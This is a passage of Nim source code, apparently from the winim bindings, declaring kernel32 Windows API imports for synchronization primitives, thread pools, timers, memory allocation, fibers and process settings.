{.winapi, stdcall, dynlib: "kernel32", importc.}proc WaitForMultipleObjectsEx*(nCount: DWORD, lpHandles: ptr HANDLE, bWaitAll: WINBOOL, dwMilliseconds: DWORD, bAlertable: WINBOOL): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenMutexW*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenEventA*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenEventW*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenSemaphoreW*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc InitializeSRWLock*(SRWLock: PSRWLOCK): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReleaseSRWLockExclusive*(SRWLock: PSRWLOCK): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReleaseSRWLockShared*(SRWLock: PSRWLOCK): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc AcquireSRWLockExclusive*(SRWLock: PSRWLOCK): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc AcquireSRWLockShared*(SRWLock: PSRWLOCK): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc TryAcquireSRWLockExclusive*(SRWLock: PSRWLOCK): BOOLEAN {.winapi, stdcall, dynlib: "kernel32", importc.}proc TryAcquireSRWLockShared*(SRWLock: PSRWLOCK): BOOLEAN {.winapi, stdcall, dynlib: "kernel32", importc.}proc InitializeCriticalSectionEx*(lpCriticalSection: LPCRITICAL_SECTION, dwSpinCount: DWORD, Flags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc InitOnceInitialize*(InitOnce: PINIT_ONCE): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc InitOnceExecuteOnce*(InitOnce: PINIT_ONCE, InitFn: PINIT_ONCE_FN, Parameter: PVOID, Context: ptr LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc InitOnceBeginInitialize*(lpInitOnce: LPINIT_ONCE, dwFlags: DWORD, fPending: PBOOL, lpContext: ptr LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc InitOnceComplete*(lpInitOnce: LPINIT_ONCE, dwFlags: DWORD, lpContext: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc InitializeConditionVariable*(ConditionVariable: PCONDITION_VARIABLE): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc WakeConditionVariable*(ConditionVariable: PCONDITION_VARIABLE): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc WakeAllConditionVariable*(ConditionVariable: PCONDITION_VARIABLE): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc SleepConditionVariableCS*(ConditionVariable: PCONDITION_VARIABLE, CriticalSection: PCRITICAL_SECTION, dwMilliseconds: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SleepConditionVariableSRW*(ConditionVariable: PCONDITION_VARIABLE, SRWLock: PSRWLOCK, dwMilliseconds: DWORD, Flags: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateMutexExA*(lpMutexAttributes: LPSECURITY_ATTRIBUTES, lpName: LPCSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateMutexExW*(lpMutexAttributes: LPSECURITY_ATTRIBUTES, lpName: LPCWSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateEventExA*(lpEventAttributes: LPSECURITY_ATTRIBUTES, lpName: LPCSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateEventExW*(lpEventAttributes: LPSECURITY_ATTRIBUTES, lpName: LPCWSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateSemaphoreExW*(lpSemaphoreAttributes: LPSECURITY_ATTRIBUTES, lInitialCount: LONG, lMaximumCount: LONG, lpName: LPCWSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc InitializeCriticalSection*(lpCriticalSection: LPCRITICAL_SECTION): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc InitializeCriticalSectionAndSpinCount*(lpCriticalSection: LPCRITICAL_SECTION, dwSpinCount: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetCriticalSectionSpinCount*(lpCriticalSection: LPCRITICAL_SECTION, dwSpinCount: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc WaitForSingleObject*(hHandle: HANDLE, dwMilliseconds: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc SleepEx*(dwMilliseconds: DWORD, bAlertable: WINBOOL): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateMutexA*(lpMutexAttributes: LPSECURITY_ATTRIBUTES, bInitialOwner: WINBOOL, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateMutexW*(lpMutexAttributes: LPSECURITY_ATTRIBUTES, bInitialOwner: WINBOOL, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateEventA*(lpEventAttributes: LPSECURITY_ATTRIBUTES, bManualReset: WINBOOL, bInitialState: WINBOOL, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateEventW*(lpEventAttributes: LPSECURITY_ATTRIBUTES, bManualReset: WINBOOL, bInitialState: WINBOOL, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetWaitableTimer*(hTimer: HANDLE, lpDueTime: ptr LARGE_INTEGER, lPeriod: LONG, pfnCompletionRoutine: PTIMERAPCROUTINE, lpArgToCompletionRoutine: LPVOID, fResume: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CancelWaitableTimer*(hTimer: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenWaitableTimerW*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpTimerName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnterSynchronizationBarrier*(lpBarrier: LPSYNCHRONIZATION_BARRIER, dwFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc InitializeSynchronizationBarrier*(lpBarrier: LPSYNCHRONIZATION_BARRIER, lTotalThreads: LONG, lSpinCount: LONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteSynchronizationBarrier*(lpBarrier: LPSYNCHRONIZATION_BARRIER): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc Sleep*(dwMilliseconds: DWORD): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc SignalObjectAndWait*(hObjectToSignal: HANDLE, hObjectToWaitOn: HANDLE, dwMilliseconds: DWORD, bAlertable: WINBOOL): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateWaitableTimerExW*(lpTimerAttributes: LPSECURITY_ATTRIBUTES, lpTimerName: LPCWSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetWaitableTimerEx*(hTimer: HANDLE, lpDueTime: ptr LARGE_INTEGER, lPeriod: LONG, pfnCompletionRoutine: PTIMERAPCROUTINE, lpArgToCompletionRoutine: LPVOID, WakeContext: PREASON_CONTEXT, TolerableDelay: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemTime*(lpSystemTime: LPSYSTEMTIME): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemTimeAsFileTime*(lpSystemTimeAsFileTime: LPFILETIME): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetLocalTime*(lpSystemTime: LPSYSTEMTIME): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNativeSystemInfo*(lpSystemInfo: LPSYSTEM_INFO): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetTickCount64*(): ULONGLONG {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetVersion*(): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalMemoryStatusEx*(lpBuffer: LPMEMORYSTATUSEX): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetLocalTime*(lpSystemTime: ptr SYSTEMTIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemInfo*(lpSystemInfo: LPSYSTEM_INFO): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetTickCount*(): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemTimeAdjustment*(lpTimeAdjustment: PDWORD, lpTimeIncrement: PDWORD, lpTimeAdjustmentDisabled: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemDirectoryA*(lpBuffer: LPSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemDirectoryW*(lpBuffer: LPWSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetWindowsDirectoryA*(lpBuffer: LPSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetWindowsDirectoryW*(lpBuffer: LPWSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemWindowsDirectoryA*(lpBuffer: LPSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemWindowsDirectoryW*(lpBuffer: LPWSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetComputerNameExA*(NameType: COMPUTER_NAME_FORMAT, lpBuffer: LPSTR, nSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetComputerNameExW*(NameType: COMPUTER_NAME_FORMAT, lpBuffer: LPWSTR, nSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetComputerNameExW*(NameType: COMPUTER_NAME_FORMAT, lpBuffer: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetSystemTime*(lpSystemTime: ptr SYSTEMTIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetVersionExA*(lpVersionInformation: LPOSVERSIONINFOA): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetVersionExW*(lpVersionInformation: LPOSVERSIONINFOW): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetLogicalProcessorInformation*(Buffer: PSYSTEM_LOGICAL_PROCESSOR_INFORMATION, ReturnedLength: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemTimePreciseAsFileTime*(lpSystemTimeAsFileTime: LPFILETIME): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnumSystemFirmwareTables*(FirmwareTableProviderSignature: DWORD, pFirmwareTableEnumBuffer: PVOID, BufferSize: DWORD): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemFirmwareTable*(FirmwareTableProviderSignature: DWORD, FirmwareTableID: DWORD, pFirmwareTableBuffer: PVOID, BufferSize: DWORD): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProductInfo*(dwOSMajorVersion: DWORD, dwOSMinorVersion: DWORD, dwSpMajorVersion: DWORD, dwSpMinorVersion: DWORD, pdwReturnedProductType: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetLogicalProcessorInformationEx*(RelationshipType: LOGICAL_PROCESSOR_RELATIONSHIP, Buffer: PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, ReturnedLength: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNumaHighestNodeNumber*(HighestNodeNumber: PULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNumaNodeProcessorMaskEx*(Node: USHORT, ProcessorMask: PGROUP_AFFINITY): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateThreadpool*(reserved: PVOID): PTP_POOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadpoolThreadMaximum*(ptpp: PTP_POOL, cthrdMost: DWORD): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadpoolThreadMinimum*(ptpp: PTP_POOL, cthrdMic: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadpoolStackInformation*(ptpp: PTP_POOL, ptpsi: PTP_POOL_STACK_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryThreadpoolStackInformation*(ptpp: PTP_POOL, ptpsi: PTP_POOL_STACK_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CloseThreadpool*(ptpp: PTP_POOL): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateThreadpoolCleanupGroup*(): PTP_CLEANUP_GROUP {.winapi, stdcall, dynlib: "kernel32", importc.}proc CloseThreadpoolCleanupGroupMembers*(ptpcg: PTP_CLEANUP_GROUP, fCancelPendingCallbacks: WINBOOL, pvCleanupContext: PVOID): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc CloseThreadpoolCleanupGroup*(ptpcg: PTP_CLEANUP_GROUP): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetEventWhenCallbackReturns*(pci: PTP_CALLBACK_INSTANCE, evt: HANDLE): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReleaseSemaphoreWhenCallbackReturns*(pci: PTP_CALLBACK_INSTANCE, sem: HANDLE, crel: DWORD): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReleaseMutexWhenCallbackReturns*(pci: PTP_CALLBACK_INSTANCE, mut: HANDLE): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc LeaveCriticalSectionWhenCallbackReturns*(pci: PTP_CALLBACK_INSTANCE, pcs: PCRITICAL_SECTION): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc FreeLibraryWhenCallbackReturns*(pci: PTP_CALLBACK_INSTANCE, `mod`: HMODULE): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc CallbackMayRunLong*(pci: PTP_CALLBACK_INSTANCE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DisassociateCurrentThreadFromCallback*(pci: PTP_CALLBACK_INSTANCE): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc TrySubmitThreadpoolCallback*(pfns: PTP_SIMPLE_CALLBACK, pv: PVOID, pcbe: PTP_CALLBACK_ENVIRON): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateThreadpoolWork*(pfnwk: PTP_WORK_CALLBACK, pv: PVOID, pcbe: PTP_CALLBACK_ENVIRON): PTP_WORK {.winapi, stdcall, dynlib: "kernel32", importc.}proc SubmitThreadpoolWork*(pwk: PTP_WORK): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc WaitForThreadpoolWorkCallbacks*(pwk: PTP_WORK, fCancelPendingCallbacks: WINBOOL): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc CloseThreadpoolWork*(pwk: PTP_WORK): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateThreadpoolTimer*(pfnti: PTP_TIMER_CALLBACK, pv: PVOID, pcbe: PTP_CALLBACK_ENVIRON): PTP_TIMER {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadpoolTimer*(pti: PTP_TIMER, pftDueTime: PFILETIME, msPeriod: DWORD, msWindowLength: DWORD): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsThreadpoolTimerSet*(pti: PTP_TIMER): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WaitForThreadpoolTimerCallbacks*(pti: PTP_TIMER, fCancelPendingCallbacks: WINBOOL): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc CloseThreadpoolTimer*(pti: PTP_TIMER): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateThreadpoolWait*(pfnwa: PTP_WAIT_CALLBACK, pv: PVOID, pcbe: PTP_CALLBACK_ENVIRON): PTP_WAIT {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadpoolWait*(pwa: PTP_WAIT, h: HANDLE, pftTimeout: PFILETIME): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc WaitForThreadpoolWaitCallbacks*(pwa: PTP_WAIT, fCancelPendingCallbacks: WINBOOL): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc CloseThreadpoolWait*(pwa: PTP_WAIT): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateThreadpoolIo*(fl: HANDLE, pfnio: PTP_WIN32_IO_CALLBACK, pv: PVOID, pcbe: PTP_CALLBACK_ENVIRON): PTP_IO {.winapi, stdcall, dynlib: "kernel32", importc.}proc StartThreadpoolIo*(pio: PTP_IO): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc CancelThreadpoolIo*(pio: PTP_IO): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc WaitForThreadpoolIoCallbacks*(pio: PTP_IO, fCancelPendingCallbacks: WINBOOL): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc CloseThreadpoolIo*(pio: PTP_IO): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadpoolTimerEx*(pti: PTP_TIMER, pftDueTime: PFILETIME, msPeriod: DWORD, msWindowLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadpoolWaitEx*(pwa: PTP_WAIT, h: HANDLE, pftTimeout: PFILETIME, Reserved: PVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateTimerQueueTimer*(phNewTimer: PHANDLE, TimerQueue: HANDLE, Callback: WAITORTIMERCALLBACK, Parameter: PVOID, DueTime: DWORD, Period: DWORD, Flags: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteTimerQueueTimer*(TimerQueue: HANDLE, Timer: HANDLE, CompletionEvent: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueueUserWorkItem*(Function: LPTHREAD_START_ROUTINE, Context: PVOID, Flags: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc UnregisterWaitEx*(WaitHandle: HANDLE, CompletionEvent: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateTimerQueue*(): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc ChangeTimerQueueTimer*(TimerQueue: HANDLE, Timer: HANDLE, DueTime: ULONG, Period: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteTimerQueueEx*(TimerQueue: HANDLE, CompletionEvent: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EncodePointer*(Ptr: PVOID): PVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc DecodePointer*(Ptr: PVOID): PVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc EncodeSystemPointer*(Ptr: PVOID): PVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc DecodeSystemPointer*(Ptr: PVOID): PVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc Beep*(dwFreq: DWORD, dwDuration: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc Wow64DisableWow64FsRedirection*(OldValue: ptr PVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc Wow64RevertWow64FsRedirection*(OlValue: PVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsWow64Process*(hProcess: HANDLE, Wow64Process: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalAlloc*(uFlags: UINT, dwBytes: SIZE_T): HGLOBAL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalReAlloc*(hMem: HGLOBAL, dwBytes: SIZE_T, uFlags: UINT): HGLOBAL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalSize*(hMem: HGLOBAL): SIZE_T {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalFlags*(hMem: HGLOBAL): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalLock*(hMem: HGLOBAL): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalHandle*(pMem: LPCVOID): HGLOBAL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalUnlock*(hMem: HGLOBAL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalFree*(hMem: HGLOBAL): HGLOBAL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalCompact*(dwMinFree: DWORD): SIZE_T {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalFix*(hMem: HGLOBAL): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalUnfix*(hMem: HGLOBAL): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalWire*(hMem: HGLOBAL): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalUnWire*(hMem: HGLOBAL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalMemoryStatus*(lpBuffer: LPMEMORYSTATUS): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc LocalAlloc*(uFlags: UINT, uBytes: SIZE_T): HLOCAL {.winapi, stdcall, dynlib: "kernel32", importc.}proc LocalReAlloc*(hMem: HLOCAL, uBytes: SIZE_T, uFlags: UINT): HLOCAL {.winapi, stdcall, dynlib: "kernel32", importc.}proc LocalLock*(hMem: HLOCAL): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc LocalHandle*(pMem: LPCVOID): HLOCAL {.winapi, stdcall, dynlib: "kernel32", importc.}proc LocalUnlock*(hMem: HLOCAL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc LocalSize*(hMem: HLOCAL): SIZE_T {.winapi, stdcall, dynlib: "kernel32", importc.}proc LocalFlags*(hMem: HLOCAL): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc LocalFree*(hMem: HLOCAL): HLOCAL {.winapi, stdcall, dynlib: "kernel32", importc.}proc LocalShrink*(hMem: HLOCAL, cbNewSize: UINT): SIZE_T {.winapi, stdcall, dynlib: "kernel32", importc.}proc LocalCompact*(uMinFree: UINT): SIZE_T {.winapi, stdcall, dynlib: "kernel32", importc.}proc VirtualAllocExNuma*(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD, nndPreferred: DWORD): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessorSystemCycleTime*(Group: USHORT, Buffer: PSYSTEM_PROCESSOR_CYCLE_TIME_INFORMATION, ReturnedLength: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetPhysicallyInstalledSystemMemory*(TotalMemoryInKilobytes: PULONGLONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetBinaryTypeA*(lpApplicationName: LPCSTR, lpBinaryType: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetBinaryTypeW*(lpApplicationName: LPCWSTR, lpBinaryType: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetShortPathNameA*(lpszLongPath: LPCSTR, lpszShortPath: LPSTR, cchBuffer: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetLongPathNameTransactedA*(lpszShortPath: LPCSTR, lpszLongPath: LPSTR, cchBuffer: DWORD, hTransaction: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetLongPathNameTransactedW*(lpszShortPath: LPCWSTR, lpszLongPath: LPWSTR, cchBuffer: DWORD, hTransaction: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessAffinityMask*(hProcess: HANDLE, lpProcessAffinityMask: PDWORD_PTR, lpSystemAffinityMask: PDWORD_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetProcessAffinityMask*(hProcess: HANDLE, dwProcessAffinityMask: DWORD_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessIoCounters*(hProcess: HANDLE, lpIoCounters: PIO_COUNTERS): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessWorkingSetSize*(hProcess: HANDLE, lpMinimumWorkingSetSize: PSIZE_T, lpMaximumWorkingSetSize: PSIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetProcessWorkingSetSize*(hProcess: HANDLE, dwMinimumWorkingSetSize: SIZE_T, dwMaximumWorkingSetSize: SIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FatalExit*(ExitCode: int32): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetEnvironmentStringsA*(NewEnvironment: LPCH): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc RaiseFailFastException*(pExceptionRecord: PEXCEPTION_RECORD, pContextRecord: PCONTEXT, dwFlags: DWORD): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadIdealProcessor*(hThread: HANDLE, dwIdealProcessor: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateFiber*(dwStackSize: SIZE_T, lpStartAddress: LPFIBER_START_ROUTINE, lpParameter: LPVOID): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateFiberEx*(dwStackCommitSize: SIZE_T, dwStackReserveSize: SIZE_T, dwFlags: DWORD, lpStartAddress: LPFIBER_START_ROUTINE, lpParameter: LPVOID): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteFiber*(lpFiber: LPVOID): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc ConvertThreadToFiber*(lpParameter: LPVOID): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc ConvertThreadToFiberEx*(lpParameter: LPVOID, dwFlags: DWORD): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc ConvertFiberToThread*(): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SwitchToFiber*(lpFiber: LPVOID): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadAffinityMask*(hThread: HANDLE, dwThreadAffinityMask: DWORD_PTR): DWORD_PTR {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetThreadInformation*(hThread: HANDLE, ThreadInformationClass: THREAD_INFORMATION_CLASS, ThreadInformation: LPVOID, ThreadInformationSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadInformation*(hThread: HANDLE, ThreadInformationClass: THREAD_INFORMATION_CLASS, ThreadInformation: LPVOID, ThreadInformationSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessInformation*(hProcess: HANDLE, ProcessInformationClass: PROCESS_INFORMATION_CLASS, ProcessInformation: LPVOID, ProcessInformationSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetProcessInformation*(hProcess: HANDLE, ProcessInformationClass: PROCESS_INFORMATION_CLASS, ProcessInformation: LPVOID, ProcessInformationSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetProcessDEPPolicy*(dwFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessDEPPolicy*(hProcess: HANDLE, lpFlags: LPDWORD, lpPermanent: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetProcessPriorityBoost*(hProcess: HANDLE, bDisablePriorityBoost: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessPriorityBoost*(hProcess: HANDLE, pDisablePriorityBoost: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc RequestWakeupLatency*(latency: LATENCY_TIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsSystemResumeAutomatic*(): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetThreadIOPendingFlag*(hThread: HANDLE, lpIOIsPending: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}when winimCpu64:  type    LPLDT_ENTRY* = LPVOIDwhen winimCpu32:  type    LPLDT_ENTRY* = PLDT_ENTRYproc GetThreadSelectorEntry*(hThread: HANDLE, dwSelector: DWORD, lpSelectorEntry: LPLDT_ENTRY): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadExecutionState*(esFlags: EXECUTION_STATE): EXECUTION_STATE {.winapi, stdcall, dynlib: "kernel32", importc.}proc PowerCreateRequest*(Context: PREASON_CONTEXT): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc 